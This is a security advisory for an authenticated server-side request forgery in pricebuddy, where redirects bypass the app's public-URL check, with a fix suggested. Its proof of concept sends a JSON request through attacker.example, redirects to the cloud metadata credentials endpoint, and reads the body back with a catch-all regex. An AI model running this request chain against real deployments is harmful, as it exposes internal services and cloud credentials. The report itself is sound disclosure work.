# pricebuddy — authenticated SSRF via redirect bypass of the `PublicHttpUrl` guard

- **Project:** [`jez500/pricebuddy`](https://github.com/jez500/pricebuddy) — self-hosted price tracker (Laravel + Filament), ~1.4k★.
- **Commit reviewed:** `main` @ `34f2b2f7ca3b9853d83ec686e46ad74fc0f21e12` (2026-10-05). App version string is `development` (no release pin); maintainer to confirm affected range.
- **Dependency in the loop:** `jez500/web-scraper-for-laravel` `^1.0.9` (same author).
- **Class:** CWE-918 (Server-Side Request Forgery), via an incomplete SSRF guard (CWE-918 + the "validate-then-fetch" TOCTOU / open-redirect follow pattern).
- **Auth:** Authenticated — a Sanctum API token with the `meta-extraction:extract` ability.
- **Severity:** High-ish. Suggested CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L` → ~**7.1**.

## Summary

pricebuddy's `POST /api/meta-extraction` endpoint fetches a caller-supplied `url`
server-side and returns data extracted from the response. The `url` is guarded by
a careful anti-SSRF validation rule (`App\Rules\PublicHttpUrl`) that resolves the
host and rejects loopback/RFC1918/link-local/cloud-metadata ranges. **But the rule
validates only the initial URL; the subsequent HTTP fetch follows redirects and
never re-checks the redirect target.** An authenticated attacker points `url` at a
public host they control, which answers `302 Location: http://169.254.169.254/…`
(or any internal address); the scraper's Laravel `Http` client follows the
redirect (Guzzle default, up to 5 hops) and fetches the internal resource. Because
the same request lets the caller supply the extraction strategy
(`store.scrape_strategy.*`), the internal response body is **readable**: the
attacker chooses a regex/xpath/json/selector that returns arbitrary slices of it.

## Request path

`routes/api.php`:
```php
Route::post('/meta-extraction', MetaExtractionController::class)
    ->middleware(['auth:sanctum', 'ability:'.ApiAbility::MetaExtractionExtract->value]); // 'meta-extraction:extract'
```

`MetaExtractionController` → `MetaExtractionService::extract($url, $store, $heal)`:
- `MetaExtractionRequest` validates `url` with `['required','string', new PublicHttpUrl]`.
- When no configured store matches the host, `extractWithAutoCreate()` runs, which
  calls `AutoCreateStore::new($url)->detect()`. `AutoCreateStore::DEFAULT_SCRAPER =
  ScraperService::Http` → direct HTTP fetch **from the app** (not the optional
  `scraper:3000` browser microservice).
- If the caller also supplies a `store` array, `resolveStore()` returns a
  `new Store($merged)` (non-null) and `extractWithStore()` runs
  `ScrapeUrl::new($url)->scrape(['store' => $store])` with the **attacker-supplied
  `scrape_strategy`**.

The fetch itself, in `jez500/web-scraper-for-laravel`:
```php
// WebScraperHttp::getRequest()
return Http::withHeaders($this->buildHeaders())->timeout($this->scraperRequestTimeout);
// Drivers/HttpDriver::fetch()
return $scraper->getRequest()->get($scraper->getUrl())->body();
```
No `->withoutRedirecting()`, no `allow_redirects` override anywhere in the package,
so Guzzle's default redirect-following applies.

## Root cause — validate-once, fetch-follows-redirects

`App\Rules\PublicHttpUrl::validate()` resolves `parse_url($value)['host']` and
checks its A/AAAA records against blocked CIDRs. It is thorough for the *submitted*
host, but:

1. **It runs once, on the initial URL.** Nothing re-validates the host after an
   HTTP redirect. Guzzle (via Laravel `Http`) follows up to 5 redirects by default,
   and the scraper does not disable this, so a `302`/`301` to an internal address is
   fetched transparently.
2. **DNS-rebinding TOCTOU.** The rule resolves the host with `gethostbynamel()` /
   `dns_get_record()` at validation time; the fetch re-resolves independently later.
   A short-TTL record that answers public at check time and private at fetch time
   bypasses the guard. (Redirect is the simpler, deterministic bypass.)

## Readability

`extractWithStore()` applies the caller's `store.scrape_strategy` to the fetched
body via `ScrapeUrl::scrapeOption()` → `StrategyExtractor::extract()`. The request
schema (`MetaExtractionRequest`) accepts `store.scrape_strategy.title.{type,value}`
with `type` in `{selector, regex, xpath, json, schema_org}`. So the attacker sets,
e.g., `title = {type: regex, value: '(?s)(.*)'}` (or an xpath/json path) and reads
chosen slices of the internal response in the returned `title`/`price`/`image`
fields — turning a blind SSRF into a readable one (each field is capped around
`MAX_STR_LENGTH` = 1000 chars, so large responses are read in slices with different
patterns/offsets).

## Proof of concept

`POST /api/meta-extraction` (Sanctum token with `meta-extraction:extract`):
```json
{
  "url": "http://attacker.example/landing",
  "store": {
    "domains": [{"domain": "attacker.example"}],
    "scrape_strategy": { "title": { "type": "regex", "value": "(?s)(.*)" } }
  }
}
```
`http://attacker.example/landing` is a public host → **passes `PublicHttpUrl`**. It
responds `302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/…`.
The scraper follows the redirect, fetches the metadata endpoint, and the response's
`title` carries the internal body back to the attacker.

**Runtime demonstration (local, two parts):**

Part 1 — the *real* `PublicHttpUrl` rule:
```
http://8.8.8.8/product/1                 => PASSES validator      (public host)
http://127.0.0.1:9000/secret             => BLOCKED
http://localhost/secret                  => BLOCKED
http://169.254.169.254/latest/meta-data/ => BLOCKED
http://[::1]/secret                      => BLOCKED
```
The rule passes a public host and blocks internal ones — and inspects only the
*initial* URL.

Part 2 — the fetch (Laravel `Http`/Guzzle default, which the scraper does not
disable) following a `302` from the (public) submitted host to an internal target:
```
-- following redirects:      INTERNAL-ONLY: db_password=s3cr3t; aws_key=AKIA_PRETEND (169.254.169.254 stand-in)
-- NOT following redirects:  status=302 (no body leaked)
```

PoC files: `poc/pricebuddy-ssrf-redirect-poc.sh` (+ `pricebuddy-validator-test.php`,
`pricebuddy-internal.php`, `pricebuddy-redirector.php`).

> Sandbox note: the sandbox has no outbound DNS and cannot bind a public IP, so the
> submitted "public" host is represented locally on loopback and public IPs are
> given as literals (`8.8.8.8`). In production the submitted host is the attacker's
> real public domain, which `PublicHttpUrl` passes; the redirect then crosses to the
> internal target exactly as shown.

## Suggested fix

- Disable redirect following on the scraper's HTTP client
  (`Http::...->withoutRedirecting()`), or cap at 0 hops; if redirects must be
  supported, re-run the `PublicHttpUrl` check on **every** redirect `Location`
  (Guzzle `on_redirect` callback), rejecting the request if any hop is internal.
- Defeat DNS rebinding: resolve once, reject if any resolved IP is private/reserved,
  and pin the connection to the vetted IP (`CURLOPT_RESOLVE` / a custom Guzzle
  handler), rather than letting the fetch re-resolve.
- Treat the `scraper:3000` microservice path the same way (it fetches attacker URLs
  too).

## Caveat (stated honestly)

- Authenticated: requires a valid Sanctum token carrying `meta-extraction:extract`
  (any user who can mint an API token in the panel).
- The code path (unguarded redirect follow, no re-validation, attacker-controlled
  extraction strategy) is confirmed by reading `pricebuddy` + the vendored
  `web-scraper-for-laravel`. The validator verdicts and redirect-follow behavior are
  demonstrated at runtime; a full end-to-end run against a live pricebuddy instance
  with a real Sanctum token and a real public redirector was not performed (needs a
  provisioned DB + token). The redirect-follow default is a well-established
  Laravel/Guzzle behavior, and the scraper package provably does not disable it.

## References

- `jez500/pricebuddy` @ `34f2b2f` — `app/Rules/PublicHttpUrl.php`,
  `app/Http/Requests/MetaExtractionRequest.php`,
  `app/Http/Controllers/Api/MetaExtractionController.php`,
  `app/Services/MetaExtractionService.php`, `app/Services/AutoCreateStore.php`,
  `routes/api.php`.
- `jez500/web-scraper-for-laravel` — `src/WebScraperHttp.php`,
  `src/Drivers/HttpDriver.php`.
